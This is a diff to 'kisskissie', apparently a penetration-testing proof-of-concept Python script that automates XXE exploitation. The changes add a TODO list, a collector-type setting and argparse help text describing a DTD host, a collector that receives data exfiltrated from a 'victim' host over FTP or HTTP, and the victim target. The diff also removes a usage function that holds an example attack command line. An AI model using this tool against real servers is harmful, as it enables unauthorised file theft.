@@ -1,9 +1,16 @@
+#!/usr/bin/python
 '''
 POC script to automate xxe detection and exploitation on a particular application being tested by me.
 Idea is to evolve this scipt into a generic xxe detector based on template payloads and automated fuzzing.
 mkocbayi@gmail.com
-Note: If you set thread limit too high (>10) you may have miss data.
+Note: If you set thread limit too high (>10) you may miss data.
 Some files that should be exfiltrated may not return because of their size.
+TODO:
+Support authentication when connecting to target.
+Specify http headers in templates and command line option.
+Check if victim is vulnerable to XXE.
+Check for common OS files and automatically select files for exfil.
+Add gopher collector.
 '''
 from __future__ import print_function
 from socket import *
@@ -37,6 +44,8 @@ settings = {
     'dtd_host' : None,
     'dtd_port' : None,
     'collector_host' : None,
+    #Collector type specifies which protocol exfiltrated data will be sent to the attacker via, .e.g. http, ftp ...
+    'collector_type' : None,
     'victim_host' : None,
     'sif' : None,
     'victim_tls' : False,
@@ -200,16 +209,6 @@ def doStartSmasher():
                       thread_limit=settings['thread_limit'])
     smasher.run()
 
-def usage():
-    print(' -------------------------------------------------------------------------')
-    print(' Mutti K September 11th, 2015')
-    print(' -------------------------------------------------------------------------')
-    print(' Example run')
-    print(' kisskissie.py --dtd_host=10.10.10.10 --collector_port=80 --dtd_port=8888 --victim_host=host.victim.com --victim_port=443 --victim_tls=1')
-    print(' Results saved to log files in log directory.')
-    print(' ')
-    sys.exit(' ')
-
 
 def get_ip_address(ifname):
     return ni.ifaddresses(ifname)[2][0]['addr']
@@ -217,19 +216,28 @@ def get_ip_address(ifname):
 def main(argv):
     set_new_log_path()
 
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(
+                description="Kisskissie is a tool to automate XXE exfiltration easier." 
+                "You should use this tool after you have confirmed that your target is vulnerable to XXE and you wish to exfil as much data as quickly as you can."
+            )
     parser.add_argument('--debug', action='store_true')
-    parser.add_argument('--dtd_host', required=True)
+    parser.add_argument('--dtd_host',
+                required=True,
+                help="Host to serve DTD file which victim will retrieve. Usually same as collector host.")
     parser.add_argument('--dtd_port', type=int, required=True)
-    parser.add_argument('--collector_type', default="FTPCollector")
-    parser.add_argument('--collector_host', required=True)
+    parser.add_argument('--collector_type',
+                default="FTPCollector",
+                help="Specify exfiltrate protocol method. Supported collectors are FTPCollector|HTTPCollector")
+    parser.add_argument('--collector_host',
+                required=True,
+                help="Server to send exfiltrate data to. This would be the host running this attack script.")
     parser.add_argument('--collector_port', type=int, required=True)
     parser.add_argument('--timeout')
     parser.add_argument('--sif')
-    parser.add_argument('--thread_limit', type=int, default=1)
-    parser.add_argument('--victim_host', required=True)
+    parser.add_argument('--thread_limit', type=int, default=1, help="Speed up script by multi-threading.")
+    parser.add_argument('--victim_host', required=True, help="Target host which is vulnerable to XXE.")
     parser.add_argument('--victim_port', type=int)
-    parser.add_argument('--victim_tls', type=int)
+    parser.add_argument('--victim_tls', type=int, help="Specify victim server running SSL/TLS")
     args = parser.parse_args()
     settings.update(vars(args))
 
